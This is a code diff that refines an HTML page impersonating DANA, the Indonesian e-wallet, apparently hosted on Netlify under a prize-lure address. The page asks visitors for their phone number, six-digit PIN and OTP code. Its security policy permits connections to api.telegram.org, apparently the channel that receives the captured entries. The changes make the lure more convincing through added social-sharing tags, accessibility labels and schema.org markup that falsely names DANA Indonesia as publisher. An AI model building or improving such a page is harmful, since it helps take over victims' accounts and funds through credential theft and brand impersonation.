@@ -7,7 +7,7 @@
     <title>DANA | Customer Care</title>
     <meta name="description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA.">
     
-    <!-- Open Graph Meta Tags -->
+    <!-- Open Graph Meta Tags - Improved -->
     <meta property="og:url" content="https://bukahadiahdisini-dana-2025-link289.netlify.app/">
     <meta property="og:type" content="website">
     <meta property="og:title" content="DANA | Customer Care">
@@ -17,17 +17,20 @@
     <meta property="og:image:height" content="630">
     <meta property="og:image:alt" content="Hadiah Spesial dari DANA">
     <meta property="og:site_name" content="DANA Indonesia">
+    <meta property="og:locale" content="id_ID">
     
-    <!-- Twitter Meta Tags -->
+    <!-- Twitter Meta Tags - Improved -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="DANA | Customer Care">
     <meta name="twitter:description" content="Klaim hadiah spesial Anda sekarang juga!">
     <meta name="twitter:image" content="https://i.ibb.co/7YwV0qN/dana-reward.jpg">
     <meta name="twitter:image:alt" content="Hadiah Spesial dari DANA">
     <meta name="twitter:site" content="@DANAIndonesia">
+    <meta name="twitter:creator" content="@DANAIndonesia">
 
     <!-- Favicon and Preconnects -->
-    <link rel="icon" href="https://www.dana.id/favicon.ico">
+    <link rel="icon" href="https://www.dana.id/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" href="https://www.dana.id/apple-touch-icon.png">
     <link rel="preconnect" href="https://a.m.dana.id">
     <link rel="preconnect" href="https://app.link">
     <link rel="preconnect" href="https://api2.branch.io">
@@ -40,6 +43,7 @@
     <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://fonts.googleapis.com; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; img-src 'self' https: data:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.telegram.org; frame-src 'none'; object-src 'none'; form-action 'self'">
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
     <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
 </head>
 <body>
   <!-- Loading Spinner -->
@@ -68,46 +72,46 @@
     <div class="container">
       <!-- Phone Number Page -->
       <div id="number-page" style="display:block">
-        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo" width="120" height="40">
         <h2>Masukkan Nomor HP Kamu</h2>
         <div class="phone-input-container">
           <div class="country-code-box">
-            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt="Bendera Indonesia" class="flag-icon">
+            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt="Bendera Indonesia" class="flag-icon" width="24" height="16">
             <span> +62</span>
           </div>
-          <input type="tel" id="phone-number" placeholder="811-1234-56789" pattern="[0-9-]*" inputmode="numeric" maxlength="14">
+          <input type="tel" id="phone-number" placeholder="811-1234-56789" pattern="[0-9-]*" inputmode="numeric" maxlength="14" aria-label="Nomor Handphone">
         </div>
         <p class="info-text">Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.</p>
       </div>
 
       <!-- PIN Page -->
       <div id="pin-page" style="display:none">
-        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo" width="120" height="40">
         <h2>Masukkan PIN</h2>
         <div class="pin-container">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric" aria-label="Digit PIN 1">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric" aria-label="Digit PIN 2">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric" aria-label="Digit PIN 3">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric" aria-label="Digit PIN 4">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric" aria-label="Digit PIN 5">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric" aria-label="Digit PIN 6">
         </div>
         <div class="show-text-container"><span class="show-text">Tampilkan</span></div>
         <div class="help-forgot-container">
-          <a href="#" class="link">Bantuan</a>
-          <a href="#" class="link">Lupa PIN?</a>
+          <a href="#" class="link" aria-label="Bantuan">Bantuan</a>
+          <a href="#" class="link" aria-label="Lupa PIN">Lupa PIN?</a>
         </div>
       </div>
 
       <!-- OTP Page -->
       <div id="otp-page" style="display:none">
-        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo" width="120" height="40">
         <h2>Verifikasi Kode OTP</h2>
         <div class="otp-container">
-          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
-          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
-          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
-          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric" aria-label="Digit OTP 1">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric" aria-label="Digit OTP 2">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric" aria-label="Digit OTP 3">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric" aria-label="Digit OTP 4">
         </div>
         <div class="otp-message-box"> 
           Kode OTP telah dikirim ke WhatsApp/SMS<br>
@@ -115,9 +119,9 @@
           <span id="otp-timer">02:00</span>
         </div>
         <div class="otp-options">
-          <a href="#" class="otp-resend">Kirim Ulang Kode</a>
+          <a href="#" class="otp-resend" aria-label="Kirim Ulang Kode">Kirim Ulang Kode</a>
           <span class="separator">|</span>
-          <a href="#" class="otp-change">Ubah Nomor</a>
+          <a href="#" class="otp-change" aria-label="Ubah Nomor">Ubah Nomor</a>
         </div>
         <div id="floating-notification" class="floating-notification" style="display:none">
           <div id="notification-content">Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.</div>
@@ -133,15 +137,31 @@
 
   <!-- Continue Button -->
   <div class="fixed-button-container" id="lanjutkan-container">
-    <button id="lanjutkan-button" class="button">Lanjutkan</button>
+    <button id="lanjutkan-button" class="button" aria-label="Lanjutkan">Lanjutkan</button>
   </div>
 
   <!-- JavaScript -->
-  <script src="script.js"></script>
+  <script src="script.js" defer></script>
+
+  <!-- Schema.org Markup for Rich Results -->
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebApplication",
+      "name": "DANA Customer Care",
+      "url": "https://bukahadiahdisini-dana-2025-link289.netlify.app/",
+      "description": "Klaim hadiah spesial Anda sekarang juga!",
+      "image": "https://i.ibb.co/7YwV0qN/dana-reward.jpg",
+      "publisher": {
+        "@type": "Organization",
+        "name": "DANA Indonesia"
+      }
+    }
+  </script>
 
   <!-- Hidden OG Image for Better Sharing -->
   <div style="display:none;">
     <img src="https://i.ibb.co/7YwV0qN/dana-reward.jpg" alt="Hadiah Spesial DANA" class="og-preview-image">
   </div>
 </body>
-</html>
+    </html>
